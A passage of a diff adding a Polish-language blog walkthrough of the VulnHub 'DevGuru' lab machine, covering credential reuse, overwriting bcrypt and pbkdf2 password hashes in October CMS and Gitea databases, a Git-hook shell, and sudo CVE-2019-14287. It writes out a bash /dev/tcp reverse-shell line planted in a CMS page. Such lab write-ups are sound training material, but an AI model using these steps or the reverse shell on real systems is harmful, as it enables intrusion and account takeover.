+            <span style="color:#e6db74">&#39;username&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;root&#39;</span>,     
+            <span style="color:#e6db74">&#39;password&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;&#39;</span>,         
+            <span style="color:#e6db74">&#39;charset&#39;</span>  <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;utf8&#39;</span>,     
+            <span style="color:#e6db74">&#39;prefix&#39;</span>   <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;&#39;</span>,        
+            <span style="color:#e6db74">&#39;schema&#39;</span>   <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;public&#39;</span>,  
+        <span style="color:#f92672">]</span>,                                     
+
+        <span style="color:#e6db74">&#39;sqlsrv&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#f92672">[</span>                          
+            <span style="color:#e6db74">&#39;driver&#39;</span>   <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;sqlsrv&#39;</span>,            
+            <span style="color:#e6db74">&#39;host&#39;</span>     <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;localhost&#39;</span>,         
+            <span style="color:#e6db74">&#39;port&#39;</span>     <span style="color:#f92672">=</span>&gt; 1433,                
+            <span style="color:#e6db74">&#39;database&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;database&#39;</span>,          
+            <span style="color:#e6db74">&#39;username&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;root&#39;</span>,              
+            <span style="color:#e6db74">&#39;password&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;&#39;</span>,                  
+            <span style="color:#e6db74">&#39;prefix&#39;</span>   <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;&#39;</span>,                  
+        <span style="color:#f92672">]</span>,
+</code></pre></div><p>Mamy usera i hasło -&gt; <code>october:SQ66EBYx4GT3byXH</code>. Najpierw sprawdziłem do panelu <code>October CMS</code>, ale nie działało, zadziałało na panel <code>Adminera</code>. W końcu config jest właśnie od Adminera.</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220811133847.png" alt=""  />
+</p>
+<p>Udało się wejść na panel. Szybko zlokalizowałem tabelę <code>backend_users</code>. Mamy tam informacje o userze <code>frank</code> wraz z hashem. Podjąłem nieskuteczne próby łamania.</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220809001622.png" alt=""  />
+</p>
+<p>Po długim googlowaniu, sprawdziłem ten hash na stronie poniżej.</p>
+<p><a href="https://www.tunnelsup.com/hash-analyzer/">https://www.tunnelsup.com/hash-analyzer/</a></p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220809001734.png" alt=""  />
+
+Okazało się, że jest to <code>bcrypt</code>. Mając tę wiedzę, możemy spreparować hash i podmienić go na inny, ten przez nas znany. Ja podmieniłem hasło na <code>password</code>, a wygenerowałem je na stronie <a href="https://bcrypt.online/">https://bcrypt.online/</a>.</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220811134500.png" alt=""  />
+</p>
+<hr>
+<h2 id="october-cms-dashboard">October CMS Dashboard<a hidden class="anchor" aria-hidden="true" href="#october-cms-dashboard">#</a></h2>
+<p>Udało się zalogować, jesteśmy w dashboardzie.</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220809001846.png" alt=""  />
+</p>
+<p>W tym momencie możemy w prosty sposób dostać się na maszynę. Należało wejść w <code>CMS =&gt; Pages =&gt; Add</code>. Teraz należy stworzyć nową stronę a w kodzie umieścić mały fragment. Który po wejściu automatycznie połączy się z naszym listenerem.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#66d9ef">function</span> onstart<span style="color:#f92672">(){</span>
+     exec<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/bash -c &#39;bash -i &gt; /dev/tcp/192.168.2.128/9001 0&gt;&amp;1&#39;&#34;</span><span style="color:#f92672">)</span>;
+<span style="color:#f92672">}</span>
+</code></pre></div><p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220809013238.png" alt=""  />
+</p>
+<p>Zapisałem stronę, a po wejściu na poniższy url, otrzymałem shella 😀</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220809013244.png" alt=""  />
+</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220809013254.png" alt=""  />
+</p>
+<hr>
+<h2 id="shell-jako-www-data">shell jako www-data<a hidden class="anchor" aria-hidden="true" href="#shell-jako-www-data">#</a></h2>
+<p>Kolejny krok był już trudniejszy. Użyłem <code>LinPEAS</code>, aby złapać potencjalne wektory ataku. Znalazłem interesujące informacje. W folderze <code>/var/backups</code> mamy backup aplikacji. Pliczek nie jest duży. Ma nieco ponad pół MB, ale po szybkim przejrzeniu to może być dobry trop.</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220811135317.png" alt=""  />
+
+Szukałem frazy <code>frank</code> w pliku i odkryłem, że ten plik to prawdopodobnie plik konfiguracyjny <code>Gitea</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat /var/backups/app.ini.bak | grep frank -A10 -B10
+</code></pre></div><p>Mamy nawet tzw. secret_tokeny, ale po chwili scrollowania znalazłem hasło i usera. Jak widać na screenie jest to username i hasło do <code>mysql</code>, ja rozumiałem to dopiero po dłuższej chwili próbując wejść od razu na <code>Gitea</code>.</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220811135906.png" alt=""  />
+</p>
+<p>A tutaj kluczem jest dostanie się ponownie na <code>Adminera</code>, tym razem na bazę danych <code>gitea</code>.</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220811140141.png" alt=""  />
+</p>
+<p>Ponownie szybko znalazłem tabelę <code>user</code>, w której mamy ponownie <code>franka</code>, ale teraz mamy całkowicie inny hash. Jest to <code>pbkdf2</code>.</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220811140256.png" alt=""  />
+</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220809025444.png" alt=""  />
+
+Podjąłem próby łamania hasha, oczywiście bezskuteczne.  Znalazłem stronę, która generuje takie hashe -&gt; <a href="https://neurotechnics.com/tools/pbkdf2-test">https://neurotechnics.com/tools/pbkdf2-test</a></p>
+<p>Dodatkową trudnością było ustawienie ilości bajtów tego hasha. Gdy dopasowałem oryginalny hash do tego tworzonego, ustaliłem, że liczba bajtów to <code>50</code>, salt mamy podaną powyżej. Została umieszczona w generatorze. No i wygenerowałem proste hasło <code>password</code>.</p>
+<p><code>xxxxxxxx</code> = <code>c200e0d03d1604cee72c484f154dd82d75c7247b04ea971a96dd1def8682d02488d0323397e26a18fb806c7a20f0b564c900</code></p>
+<p>Dodatkowo sporo googlowałem ile powinno być <code>Iterations</code>. W końcu znalazłem w kodzie źródłowym <code>Gitea</code>, że dla <code>pbkdf2</code> jest to <code>10000</code>.</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220811162359.png" alt=""  />
+</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220810001840.png" alt=""  />
+</p>
+<p><code>password</code> = <code>8c1081ea93e4803d6aa627fca52970b8bb06c35e7fa2c47e1eae3e4f5e6c9515dfaf13d62292547583aef0ee683f92e71c40</code></p>
+<hr>
+<h2 id="gitea">gitea<a hidden class="anchor" aria-hidden="true" href="#gitea">#</a></h2>
+<p>Udało się zalogować na <code>Gitea</code> na poniższe dane <code>frank:password</code>. Teraz kolejny krok, czyli dostanie się na maszynę, tym razem już jako <code>frank</code>. Doczytałem, że jeżeli nasz user ma uprawnienia admina, możemy dodać w ustawieniach danego repo kod, który wykona się przy jakiejkolwiek modyfikacji repo. Wchodzimy w repo -&gt; Settings -&gt; Git Hooks. Tutaj na dole wrzuciłem prosty skrypt bashowy.
+Teraz wystarczyło, że zmodyfikowałem lub dodałem jakikolwiek plik w repo. Kod wykonał się, a ja otrzymałem odpowiedź na listenerze.</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220811162630.png" alt=""  />
+</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220810004637.png" alt=""  />
+</p>
+<hr>
+<h2 id="shell-jako-frank">shell jako frank<a hidden class="anchor" aria-hidden="true" href="#shell-jako-frank">#</a></h2>
+<p>Odpaliłem ponownie <code>LinPEAS</code>. Nasz user może wykonywać program <code>sqlite3</code> z uprawnieniami roota. Jedyny szczegół jest taki, że potrzeba do tego hasła usera <code>frank</code>. Nie wiedziałem jak to przeskoczyć. Po długim googlowaniu podejrzałem wskazówkę, że należy zainteresować się wersją sudo.</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220810010516.png" alt=""  />
+</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220811163314.png" alt=""  />
+</p>
+<p>Ta wersja sudo ma bardzo poważną podatność <code>CVE-2019-14287</code>, która pozwala na obejście zapytania o hasło. Szerzej opisane jest to tutaj <a href="https://www.exploit-db.com/exploits/47502">https://www.exploit-db.com/exploits/47502</a></p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220811163746.png" alt=""  />
+</p>
+<p>Mamy roota.</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220810011719.png" alt=""  />
+</p>
+<hr>
+<h2 id="root-proof">Root proof<a hidden class="anchor" aria-hidden="true" href="#root-proof">#</a></h2>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220811164031.png" alt=""  />
+</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://suszczyk.github.io/tags/linux/">Linux</a></li>
+      <li><a href="https://suszczyk.github.io/tags/medium/">Medium</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://suszczyk.github.io/posts/hackthebox/logforge/">
+    <span class="title">« Prev Page</span>
+    <br>
+    <span>LogForge - HackTheBox</span>
+  </a>
+  <a class="next" href="https://suszczyk.github.io/posts/vulnhub/stapler/">
+    <span class="title">Next Page »</span>
+    <br>
+    <span>Stapler</span>
+  </a>
+</nav>
+
+
+<div class="share-buttons">
+    <a target="_blank" rel="noopener noreferrer" aria-label="share DevGuru on twitter"
+        href="https://twitter.com/intent/tweet/?text=DevGuru&amp;url=https%3a%2f%2fsuszczyk.github.io%2fposts%2fvulnhub%2fdevguru%2f&amp;hashtags=Linux%2cMedium">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-253.927,424.544c135.939,0 210.268,-112.643 210.268,-210.268c0,-3.218 0,-6.437 -0.153,-9.502c14.406,-10.421 26.973,-23.448 36.935,-38.314c-13.18,5.824 -27.433,9.809 -42.452,11.648c15.326,-9.196 26.973,-23.602 32.49,-40.92c-14.252,8.429 -30.038,14.56 -46.896,17.931c-13.487,-14.406 -32.644,-23.295 -53.946,-23.295c-40.767,0 -73.87,33.104 -73.87,73.87c0,5.824 0.613,11.494 1.992,16.858c-61.456,-3.065 -115.862,-32.49 -152.337,-77.241c-6.284,10.881 -9.962,23.601 -9.962,37.088c0,25.594 13.027,48.276 32.95,61.456c-12.107,-0.307 -23.448,-3.678 -33.41,-9.196l0,0.92c0,35.862 25.441,65.594 59.311,72.49c-6.13,1.686 -12.72,2.606 -19.464,2.606c-4.751,0 -9.348,-0.46 -13.946,-1.38c9.349,29.426 36.628,50.728 68.965,51.341c-25.287,19.771 -57.164,31.571 -91.8,31.571c-5.977,0 -11.801,-0.306 -17.625,-1.073c32.337,21.15 71.264,33.41 112.95,33.41Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share DevGuru on linkedin"
+        href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fsuszczyk.github.io%2fposts%2fvulnhub%2fdevguru%2f&amp;title=DevGuru&amp;summary=DevGuru&amp;source=https%3a%2f%2fsuszczyk.github.io%2fposts%2fvulnhub%2fdevguru%2f">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share DevGuru on reddit"
+        href="https://reddit.com/submit?url=https%3a%2f%2fsuszczyk.github.io%2fposts%2fvulnhub%2fdevguru%2f&title=DevGuru">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share DevGuru on facebook"
+        href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fsuszczyk.github.io%2fposts%2fvulnhub%2fdevguru%2f">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-106.468,0l0,-192.915l66.6,0l12.672,-82.621l-79.272,0l0,-53.617c0,-22.603 11.073,-44.636 46.58,-44.636l36.042,0l0,-70.34c0,0 -32.71,-5.582 -63.982,-5.582c-65.288,0 -107.96,39.569 -107.96,111.204l0,62.971l-72.573,0l0,82.621l72.573,0l0,192.915l-191.104,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share DevGuru on whatsapp"
+        href="https://api.whatsapp.com/send?text=DevGuru%20-%20https%3a%2f%2fsuszczyk.github.io%2fposts%2fvulnhub%2fdevguru%2f">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 -24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share DevGuru on telegram"
+        href="https://telegram.me/share/url?text=DevGuru&amp;url=https%3a%2f%2fsuszczyk.github.io%2fposts%2fvulnhub%2fdevguru%2f">
+        <svg version="1.1" xml:space="preserve" viewBox="2 2 28 28">
+            <path
+                d="M26.49,29.86H5.5a3.37,3.37,0,0,1-2.47-1,3.35,3.35,0,0,1-1-2.47V5.48A3.36,3.36,0,0,1,3,3,3.37,3.37,0,0,1,5.5,2h21A3.38,3.38,0,0,1,29,3a3.36,3.36,0,0,1,1,2.46V26.37a3.35,3.35,0,0,1-1,2.47A3.38,3.38,0,0,1,26.49,29.86Zm-5.38-6.71a.79.79,0,0,0,.85-.66L24.73,9.24a.55.55,0,0,0-.18-.46.62.62,0,0,0-.41-.17q-.08,0-16.53,6.11a.59.59,0,0,0-.41.59.57.57,0,0,0,.43.52l4,1.24,1.61,4.83a.62.62,0,0,0,.63.43.56.56,0,0,0,.4-.17L16.54,20l4.09,3A.9.9,0,0,0,21.11,23.15ZM13.8,20.71l-1.21-4q8.72-5.55,8.78-5.55c.15,0,.23,0,.23.16a.18.18,0,0,1,0,.06s-2.51,2.3-7.52,6.8Z" />
+        </svg>
+    </a>
+</div>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2022 <a href="https://suszczyk.github.io">Mateusz Suszczyk</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://git.io/hugopapermod" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerText = 'copy';
+
+        function copyingDone() {
+            copybutton.innerText = 'copied!';
+            setTimeout(() => {
+                copybutton.innerText = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
